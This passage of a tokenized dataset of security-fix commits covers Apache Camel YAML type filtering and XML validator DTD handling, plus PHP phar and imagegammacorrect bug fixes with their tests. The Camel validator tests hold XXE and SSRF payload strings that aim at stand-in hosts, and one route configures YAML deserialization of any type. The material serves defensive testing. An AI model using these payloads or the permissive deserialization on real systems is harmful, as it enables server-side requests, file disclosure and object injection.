"-", "safe", "-", "constructor", "\"", "class", "=", "\"", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLDataFormat", "\"", "/>", "<", "bean", "id", "=", "\"", "yaml", "-", "type", "-", "constructor", "\"", "class", "=", "\"", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLDataFormat", "\"", ">", "<", "property", "name", "=", "\"", "typeFilterDefinitions", "\"", ">", "<", "list", ">", "<", "value", ">", "type", ":", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", "<", "/", "value", ">", "<", "/", "list", ">", "<", "/", "property", ">", "<", "/", "bean", ">", "<", "bean", "id", "=", "\"", "yaml", "-", "type", "-", "constructor", "-", "strdef", "\"", "class", "=", "\"", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLDataFormat", "\"", ">", "<", "property", "name", "=", "\"", "typeFilterDefinitions", "\"", ">", "<", "list", ">", "<", "value", ">", "type", ":", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", "<", "/", "value", ">", "<", "value", ">", "regexp", ":", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "Rex", ".", "*<", "/", "value", ">", "<", "/", "list", ">", "<", "/", "property", ">", "<", "/", "bean", ">", "<", "bean", "id", "=", "\"", "yaml", "-", "all", "-", "constructor", "\"", "class", "=", "\"", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLDataFormat", "\"", ">", "<", "property", "name", "=", "\"", "allowAnyType", "\"", "value", "=", "\"", "true", "\"", "/>", "<", "/", "bean", ">", "<", "!-", "-", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "-", "->", "<", "!-", "-", "Camel", "Context", "-", "->", "<", "!-", "-", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "-", "->", "<", "camelContext", "id", "=", "\"", "camel", "\"", "xmlns", "=", "\"", "http", ":", "//", "camel", ".", "apache", ".", "org", "/", "schema", "/", "blueprint", "\"", ">", "<", "route", ">", "<", "from", "uri", "=", "\"", "direct", ":", "safe", "-", "constructor", "\"", "/>", "<", "unmarshal", "ref", "=", "\"", "yaml", "-", "safe", "-", "constructor", "\"", "/>", "<", "/", "route", ">", "<", "route", ">", "<", "from", "uri", "=", "\"", "direct", ":", "type", "-", "constructor", "\"", "/>", "<", "unmarshal", "ref", "=", "\"", "yaml", "-", "type", "-", "constructor", "\"", "/>", "<", "/", "route", ">", "<", "route", ">", "<", "from", "uri", "=", "\"", "direct", ":", "type", "-", "constructor", "-", "strdef", "\"", "/>", "<", "unmarshal", "ref", "=", "\"", "yaml", "-", "type", "-", "constructor", "-", "strdef", "\"", "/>", "<", "/", "route", ">", "<", "route", ">", "<", "from", "uri", "=", "\"", "direct", ":", "all", "-", "constructor", "\"", "/>", "<", "unmarshal", "ref", "=", "\"", "yaml", "-", "all", "-", "constructor", "\"", "/>", "<", "/", "route", ">", "<", "/", "camelContext", ">", "<", "/", "blueprint", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "60", "@", "@", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "encoding", "=", "\"", "UTF", "-", "8", "\"", "?>", "<", "!-", "-", "~", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "~", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "~", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "~", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "~", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "~", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "~", "~", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "~", "~", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "~", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "~", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "~", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "~", "limitations", "under", "the", "License", ".", "-", "->", "<", "beans", "xmlns", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "beans", "\"", "xmlns", ":", "xsi", "=", "\"", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "2001", "/", "XMLSchema", "-", "instance", "\"", "xsi", ":", "schemaLocation", "=", "\"", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "beans", "http", ":", "//", "www", ".", "springframework", ".", "org", "/", "schema", "/", "beans", "/", "spring", "-", "beans", ".", "xsd", "http", ":", "//", "camel", ".", "apache", ".", "org", "/", "schema", "/", "spring", "http", ":", "//", "camel", ".", "apache", ".", "org", "/", "schema", "/", "spring", "/", "camel", "-", "spring", ".", "xsd", "\"", ">", "<", "camelContext", "id", "=", "\"", "camel", "\"", "xmlns", "=", "\"", "http", ":", "//", "camel", ".", "apache", ".", "org", "/", "schema", "/", "spring", "\"", ">", "<", "!-", "-", "we", "define", "the", "yaml", "SnakeYAML", "data", "formats", "to", "be", "used", "-", "->", "<", "dataFormats", ">", "<", "yaml", "id", "=", "\"", "yaml", "-", "safe", "-", "constructor", "\"", "/>", "<", "yaml", "id", "=", "\"", "yaml", "-", "type", "-", "constructor", "\"", "library", "=", "\"", "SnakeYAML", "\"", ">", "<", "typeFilter", "value", "=", "\"", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", "\"", "/>", "<", "/", "yaml", ">", "<", "yaml", "id", "=", "\"", "yaml", "-", "type", "-", "constructor", "-", "strdef", "\"", "library", "=", "\"", "SnakeYAML", "\"", ">", "<", "typeFilter", "value", "=", "\"", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", "\"", "/>", "<", "typeFilter", "value", "=", "\"", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "Rex", ".", "*\"", "type", "=", "\"", "regexp", "\"", "/>", "<", "/", "yaml", ">", "<", "yaml", "id", "=", "\"", "yaml", "-", "all", "-", "constructor", "\"", "allowAnyType", "=", "\"", "true", "\"", "/>", "<", "/", "dataFormats", ">", "<", "route", ">", "<", "from", "uri", "=", "\"", "direct", ":", "safe", "-", "constructor", "\"", "/>", "<", "unmarshal", "ref", "=", "\"", "yaml", "-", "safe", "-", "constructor", "\"", "/>", "<", "/", "route", ">", "<", "route", ">", "<", "from", "uri", "=", "\"", "direct", ":", "type", "-", "constructor", "\"", "/>", "<", "unmarshal", "ref", "=", "\"", "yaml", "-", "type", "-", "constructor", "\"", "/>", "<", "/", "route", ">", "<", "route", ">", "<", "from", "uri", "=", "\"", "direct", ":", "type", "-", "constructor", "-", "strdef", "\"", "/>", "<", "unmarshal", "ref", "=", "\"", "yaml", "-", "type", "-", "constructor", "-", "strdef", "\"", "/>", "<", "/", "route", ">", "<", "route", ">", "<", "from", "uri", "=", "\"", "direct", ":", "all", "-", "constructor", "\"", "/>", "<", "unmarshal", "ref", "=", "\"", "yaml", "-", "all", "-", "constructor", "\"", "/>", "<", "/", "route", ">", "<", "/", "camelContext", ">", "<", "/", "beans", ">"], "docstring_tokens": ["object", "de-serialization"]}
{"contents": ["Fix", "bug", "#69720:", "Null", "pointer", "dereference", "in", "phar_get_fp_offset()"], "code_tokens": ["@", "@", "-", "0", ",", "0", "+", "1", ",", "40", "@", "@", "-", "-", "TEST", "-", "-", "Phar", "-", "bug", "#", "69720", "-", "Null", "pointer", "dereference", "in", "phar_get_fp_offset", "(", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "\"", "phar", "\"", "))", "die", "(", "\"", "skip", "\"", ");", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "try", "{", "/", "/", "open", "an", "existing", "phar", "$", "p", "=", "new", "Phar", "(", "__DIR__", ".", "\"/", "bug69720", ".", "phar", "\"", ",", "0", ")", ";", "/", "/", "Phar", "extends", "SPL", "'", "s", "DirectoryIterator", "class", "echo", "$", "p", "-", ">", "getMetadata", "(", ");", "foreach", "(", "new", "RecursiveIteratorIterator", "(", "$", "p", ")", "as", "$", "file", ")", "{", "/", "/", "$", "file", "is", "a", "PharFileInfo", "class", ",", "and", "inherits", "from", "SplFileInfo", "$", "temp", "=", "\"\"", ";", "$", "temp", "=", "$", "file", "-", ">", "getFileName", "(", ")", ".", "\"", "\\", "n", "\"", ";", "$", "temp", ".", "=", "file_get_contents", "(", "$", "file", "-", ">", "getPathName", "(", "))", ".", "\"", "\\", "n", "\"", ";", "/", "/", "display", "contents", "var_dump", "(", "$", "file", "-", ">", "getMetadata", "(", "))", ";", "}", "}", "catch", "(", "Exception", "$", "e", ")", "{", "echo", "'", "Could", "not", "open", "Phar", ":", "'", ",", "$", "e", ";", "}", "?", ">", "-", "-", "EXPECTF", "-", "-", "MY_METADATA_NULL", "Warning", ":", "file_get_contents", "(", "phar", ":", "//", "/%", "s", ")", ":", "failed", "to", "open", "stream", ":", "phar", "error", ":", "\"", "test", ".", "php", "\"", "is", "not", "a", "file", "in", "phar", "\"", "%", "s", ".", "phar", "\"", "in", "%", "s", ".", "php", "on", "line", "%", "d", "array", "(", "1", ")", "{", "[", "\"", "whatever", "\"", "]=", ">", "int", "(", "123", ")", "}", "object", "(", "DateTime", ")", "#", "2", "(", "3", ")", "{", "[", "\"", "date", "\"", "]=", ">", "string", "(", "26", ")", "\"", "2000", "-", "01", "-", "01", "00", ":", "00", ":", "00", ".", "000000", "\"", "[", "\"", "timezone_type", "\"", "]=", ">", "int", "(", "3", ")", "[", "\"", "timezone", "\"", "]=", ">", "string", "(", "3", ")", "\"", "UTC", "\"", "}", "@", "@", "-", "494", ",", "7", "+", "494", ",", "11", "@", "@", "int", "phar_get_entry_data", "(", "phar_entry_data", "*", "*", "ret", ",", "char", "*", "fname", ",", "int", "fname_len", ",", "char", "(", "*", "ret", ")", "->", "is_tar", "=", "entry", "-", ">", "is_tar", ";", "(", "*", "ret", ")", "->", "fp", "=", "phar_get_efp", "(", "entry", ",", "1", "TSRMLS_CC", ")", ";", "if", "(", "entry", "-", ">", "link", ")", "{", "(", "*", "ret", ")", "->", "zero", "=", "phar_get_fp_offset", "(", "phar_get_link_source", "(", "entry", "TSRMLS_CC", ")", "TSRMLS_CC", ")", ";", "phar_entry_info", "*", "link", "=", "phar_get_link_source", "(", "entry", "TSRMLS_CC", ")", ";", "if", "(", "!", "link", ")", "{", "return", "FAILURE", ";", "}", "(", "*", "ret", ")", "->", "zero", "=", "phar_get_fp_offset", "(", "link", "TSRMLS_CC", ")", ";", "}", "else", "{", "(", "*", "ret", ")", "->", "zero", "=", "phar_get_fp_offset", "(", "entry", "TSRMLS_CC", ")", ";", "}"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["Fix", "bug", "#72730", "-", "imagegammacorrect", "allows", "arbitrary", "write", "access"], "code_tokens": ["@", "@", "-", "3082", ",", "6", "+", "3082", ",", "11", "@", "@", "PHP_FUNCTION", "(", "imagegammacorrect", ")", "return", ";", "}", "if", "(", "input", "<", "=", "0", ".", "0", "|", "|", "output", "<", "=", "0", ".", "0", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Gamma", "values", "should", "be", "positive", "\"", ");", "RETURN_FALSE", ";", "}", "ZEND_FETCH_RESOURCE", "(", "im", ",", "gdImagePtr", ",", "&", "IM", ",", "-", "1", ",", "\"", "Image", "\"", ",", "le_gd", ")", ";", "if", "(", "gdImageTrueColor", "(", "im", ")", ")", "{", "@", "@", "-", "0", ",", "0", "+", "1", ",", "15", "@", "@", "-", "-", "TEST", "-", "-", "Bug", "#", "72730", ":", "imagegammacorrect", "allows", "arbitrary", "write", "access", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "function_exists", "(", "\"", "imagecreatetruecolor", "\"", "))", "die", "(", "\"", "skip", "\"", ");", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "img", "=", "imagecreatetruecolor", "(", "1", ",", "1", ")", ";", "imagegammacorrect", "(", "$", "img", ",", "-", "1", ",", "1337", ")", ";", "?", ">", "DONE", "-", "-", "EXPECTF", "-", "-", "Warning", ":", "imagegammacorrect", "(", "):", "Gamma", "values", "should", "be", "positive", "in", "%", "sbug72730", ".", "php", "on", "line", "%", "d", "DONE", "\\", "No", "newline", "at", "end", "of", "file"], "docstring_tokens": ["memory", "leakage"]}
{"contents": ["CAMEL-10894:", "XML", "Validator:", "DTD", "Handling", "improved"], "code_tokens": ["@", "@", "-", "30", ",", "7", "+", "30", ",", "6", "@", "@", "import", "org", ".", "w3c", ".", "dom", ".", "ls", ".", "LSResourceResolver", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "import", "org", ".", "apache", ".", "camel", ".", "CamelContext", ";", "import", "org", ".", "apache", ".", "camel", ".", "converter", ".", "IOConverter", ";", "import", "org", ".", "apache", ".", "camel", ".", "util", ".", "IOHelper", ";", "@", "@", "-", "41", ",", "13", "+", "40", ",", "17", "@", "@", "import", "org", ".", "slf4j", ".", "LoggerFactory", ";", "/", "**", "*", "Reads", "the", "schema", "used", "in", "the", "processor", "{", "@", "link", "ValidatingProcessor", "}", ".", "Contains", "*", "the", "method", "{", "@", "link", "clearCachedSchema", "(", ")}", "to", "force", "re", "-", "reading", "the", "schema", ".", "*", "Reads", "the", "schema", "used", "in", "the", "processor", "{", "@", "link", "ValidatingProcessor", "}", ".", "*", "A", "schema", "re", "-", "reading", "could", "be", "forced", "using", "{", "@", "link", "org", ".", "apache", ".", "camel", ".", "component", ".", "validator", ".", "ValidatorEndpoint", "#", "clearCachedSchema", "(", ")}", ".", "*", "/", "public", "class", "SchemaReader", "{", "/", "**", "Key", "of", "the", "global", "option", "to", "switch", "either", "off", "or", "on", "the", "access", "to", "external", "DTDs", "in", "the", "XML", "Validator", "for", "StreamSources", ".", "*", "Only", "effective", ",", "if", "not", "a", "custom", "schema", "factory", "is", "used", ".", "*/", "public", "static", "final", "String", "ACCESS_EXTERNAL_DTD", "=", "\"", "CamelXmlValidatorAccessExternalDTD", "\"", ";", "private", "static", "final", "Logger", "LOG", "=", "LoggerFactory", ".", "getLogger", "(", "SchemaReader", ".", "class", ")", ";", "private", "String", "schemaLanguage", "=", "XMLConstants", ".", "W3C_XML_SCHEMA_NS_URI", ";", "/", "/", "must", "be", "volatile", "because", "is", "accessed", "from", "different", "threads", "see", "ValidatorEndpoint", ".", "clearCachedSchema", "private", "volatile", "Schema", "schema", ";", "@", "@", "-", "169", ",", "6", "+", "172", ",", "14", "@", "@", "protected", "SchemaFactory", "createSchemaFactory", "(", ")", "{", "SchemaFactory", "factory", "=", "SchemaFactory", ".", "newInstance", "(", "schemaLanguage", ")", ";", "if", "(", "getResourceResolver", "(", ")", "!", "=", "null", ")", "{", "factory", ".", "setResourceResolver", "(", "getResourceResolver", "(", "))", ";", "}", "if", "(", "!", "Boolean", ".", "parseBoolean", "(", "camelContext", ".", "getProperty", "(", "ACCESS_EXTERNAL_DTD", ")", "))", "{", "try", "{", "factory", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "}", "catch", "(", "SAXException", "e", ")", "{", "LOG", ".", "error", "(", "e", ".", "getMessage", "(", "),", "e", ")", ";", "throw", "new", "IllegalStateException", "(", "e", ")", ";", "}", "}", "return", "factory", ";", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "86", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "validator", ";", "import", "java", ".", "net", ".", "UnknownHostException", ";", "import", "org", ".", "apache", ".", "camel", ".", "ContextTestSupport", ";", "import", "org", ".", "apache", ".", "camel", ".", "ValidationException", ";", "import", "org", ".", "apache", ".", "camel", ".", "builder", ".", "RouteBuilder", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "mock", ".", "MockEndpoint", ";", "import", "org", ".", "apache", ".", "camel", ".", "processor", ".", "validation", ".", "SchemaReader", ";", "public", "abstract", "class", "ValidatorDtdAccessAbstractTest", "extends", "ContextTestSupport", "{", "protected", "MockEndpoint", "finallyEndpoint", ";", "protected", "MockEndpoint", "invalidEndpoint", ";", "protected", "MockEndpoint", "unknownHostExceptionEndpoint", ";", "protected", "MockEndpoint", "validEndpoint", ";", "protected", "String", "payloud", "=", "getPayloudPart", "(", "\"", "Hello", "world", "!", "\")", ";", "protected", "String", "ssrfPayloud", "=", "\"", "<!", "DOCTYPE", "roottag", "PUBLIC", "\\", "\"-", "//", "VSR", "/", "/", "PENTEST", "/", "/", "EN", "\\", "\"", "\\", "\"", "http", ":", "//", "notexisting", "/", "test", "\\", "\">", "\\", "n", "\"", "+", "payloud", ";", "protected", "String", "xxePayloud", "=", "\"", "<!", "DOCTYPE", "updateProfile", "[", "<!", "ENTITY", "file", "SYSTEM", "\\", "\"", "http", ":", "//", "notexistinghost", "/", "test", "\\", "\">", "]>", "\\", "n", "\"", "+", "getPayloudPart", "(", "\"&", "file", ";", "\")", ";", "private", "final", "boolean", "accessExternalDTD", ";", "public", "ValidatorDtdAccessAbstractTest", "(", "boolean", "accessExternalDTD", ")", "{", "this", ".", "accessExternalDTD", "=", "accessExternalDTD", ";", "}", "private", "String", "getPayloudPart", "(", "String", "bodyValue", ")", "{", "return", "\"", "<", "mail", "xmlns", "=", "'", "http", ":", "//", "foo", ".", "com", "/", "bar", "'", "><", "subject", ">", "Hey", "<", "/", "subject", ">", "<", "body", ">", "\"", "+", "bodyValue", "+", "\"", "</", "body", ">", "</", "mail", ">", "\";", "}", "@", "Override", "protected", "void", "setUp", "(", ")", "throws", "Exception", "{", "super", ".", "setUp", "(", ");", "validEndpoint", "=", "resolveMandatoryEndpoint", "(", "\"", "mock", ":", "valid", "\"", ",", "MockEndpoint", ".", "class", ")", ";", "invalidEndpoint", "=", "resolveMandatoryEndpoint", "(", "\"", "mock", ":", "invalid", "\"", ",", "MockEndpoint", ".", "class", ")", ";", "unknownHostExceptionEndpoint", "=", "resolveMandatoryEndpoint", "(", "\"", "mock", ":", "unknownHostException", "\"", ",", "MockEndpoint", ".", "class", ")", ";", "finallyEndpoint", "=", "resolveMandatoryEndpoint", "(", "\"", "mock", ":", "finally", "\"", ",", "MockEndpoint", ".", "class", ")", ";", "}", "@", "Override", "protected", "RouteBuilder", "createRouteBuilder", "(", ")", "throws", "Exception", "{", "return", "new", "RouteBuilder", "(", ")", "{", "@", "Override", "public", "void", "configure", "(", ")", "throws", "Exception", "{", "/", "/", "switch", "on", "DTD", "Access", "if", "(", "accessExternalDTD", ")", "{", "getContext", "(", ").", "getProperties", "(", ").", "put", "(", "SchemaReader", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "true", "\"", ");", "}", "from", "(", "\"", "direct", ":", "start", "\"", ")", ".", "doTry", "(", ")", ".", "to", "(", "\"", "validator", ":", "org", "/", "apache", "/", "camel", "/", "component", "/", "validator", "/", "schema", ".", "xsd", "\"", ")", ".", "to", "(", "\"", "mock", ":", "valid", "\"", ")", ".", "doCatch", "(", "ValidationException", ".", "class", ")", ".", "to", "(", "\"", "mock", ":", "invalid", "\"", ")", ".", "doCatch", "(", "UnknownHostException", ".", "class", ")", ".", "to", "(", "\"", "mock", ":", "unknownHostException", "\"", ")", ".", "doFinally", "(", ")", ".", "to", "(", "\"", "mock", ":", "finally", "\"", ").", "end", "(", ");", "}", "}", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "61", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "validator", ";", "import", "java", ".", "io", ".", "ByteArrayInputStream", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "nio", ".", "charset", ".", "StandardCharsets", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "mock", ".", "MockEndpoint", ";", "public", "class", "ValidatorDtdAccessOffTest", "extends", "ValidatorDtdAccessAbstractTest", "{", "public", "ValidatorDtdAccessOffTest", "(", ")", "{", "super", "(", "false", ")", ";", "}", "/", "**", "Tests", "that", "no", "external", "DTD", "call", "is", "executed", "for", "StringSource", ".", "*", "/", "public", "void", "testInvalidMessageWithExternalDTDStringSource", "(", ")", "throws", "Exception", "{", "invalidEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "finallyEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "template", ".", "sendBody", "(", "\"", "direct", ":", "start", "\"", ",", "ssrfPayloud", ")", ";", "MockEndpoint", ".", "assertIsSatisfied", "(", "validEndpoint", ",", "unknownHostExceptionEndpoint", ",", "finallyEndpoint", ")", ";", "}", "/", "**", "Tests", "that", "external", "DTD", "call", "is", "not", "executed", "for", "StreamSource", ".", "*", "/", "public", "void", "testInvalidMessageWithExternalDTDStreamSource", "(", ")", "throws", "Exception", "{", "invalidEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "finallyEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "InputStream", "is", "=", "new", "ByteArrayInputStream", "(", "ssrfPayloud", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ");", "template", ".", "sendBody", "(", "\"", "direct", ":", "start", "\"", ",", "is", ")", ";", "MockEndpoint", ".", "assertIsSatisfied", "(", "validEndpoint", ",", "unknownHostExceptionEndpoint", ",", "finallyEndpoint", ")", ";", "}", "/", "**", "Tests", "that", "XXE", "is", "not", "possible", "for", "StreamSource", ".", "*", "/", "public", "void", "testInvalidMessageXXESourceStream", "(", ")", "throws", "Exception", "{", "invalidEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "finallyEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "InputStream", "is", "=", "new", "ByteArrayInputStream", "(", "xxePayloud", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ");", "template", ".", "sendBody", "(", "\"", "direct", ":", "start", "\"", ",", "is", ")", ";", "MockEndpoint", ".", "assertIsSatisfied", "(", "validEndpoint", ",", "unknownHostExceptionEndpoint", ",", "finallyEndpoint", ")", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "61", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "validator", ";", "import", "java", ".", "io", ".", "ByteArrayInputStream", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "java", ".", "nio", ".", "charset", ".", "StandardCharsets", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "mock", ".", "MockEndpoint", ";", "public", "class", "ValidatorDtdAccessOnTest", "extends", "ValidatorDtdAccessAbstractTest", "{", "public", "ValidatorDtdAccessOnTest", "(", ")", "{", "super", "(", "true", ")", ";", "}", "/", "**", "Tests", "that", "external", "DTD", "call", "is", "executed", "for", "StringSource", "by", "expecting", "an", "UnkonwHostException", ".", "*", "/", "public", "void", "testInvalidMessageWithExternalDTDStringSource", "(", ")", "throws", "Exception", "{", "unknownHostExceptionEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "finallyEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "template", ".", "sendBody", "(", "\"", "direct", ":", "start", "\"", ",", "ssrfPayloud", ")", ";", "MockEndpoint", ".", "assertIsSatisfied", "(", "validEndpoint", ",", "unknownHostExceptionEndpoint", ",", "finallyEndpoint", ")", ";", "}", "/", "**", "Tests", "that", "external", "DTD", "call", "is", "executed", "for", "StreamSourceby", "expecting", "an", "UnkonwHostException", ".", "*", "/", "public", "void", "testInvalidMessageWithExternalDTDStreamSource", "(", ")", "throws", "Exception", "{", "unknownHostExceptionEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "finallyEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "InputStream", "is", "=", "new", "ByteArrayInputStream", "(", "ssrfPayloud", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ");", "template", ".", "sendBody", "(", "\"", "direct", ":", "start", "\"", ",", "is", ")", ";", "MockEndpoint", ".", "assertIsSatisfied", "(", "validEndpoint", ",", "unknownHostExceptionEndpoint", ",", "finallyEndpoint", ")", ";", "}", "/", "**", "Tests", "that", "XXE", "is", "possible", "for", "StreamSource", "by", "expecting", "an", "UnkonwHostException", ".", "*", "/", "public", "void", "testInvalidMessageXXESourceStream", "(", ")", "throws", "Exception", "{", "unknownHostExceptionEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "finallyEndpoint", ".", "expectedMessageCount", "(", "1", ")", ";", "InputStream", "is", "=", "new", "ByteArrayInputStream", "(", "xxePayloud", ".", "getBytes", "(", "StandardCharsets", ".", "UTF_8", ")", ");", "template", ".", "sendBody", "(", "\"", "direct", ":", "start", "\"", ",", "is", ")", ";", "MockEndpoint", ".", "assertIsSatisfied", "(", "validEndpoint", ",", "unknownHostExceptionEndpoint", ",", "finallyEndpoint", ")", ";", "}", "}"], "docstring_tokens": ["xml", "external", "entity"]}
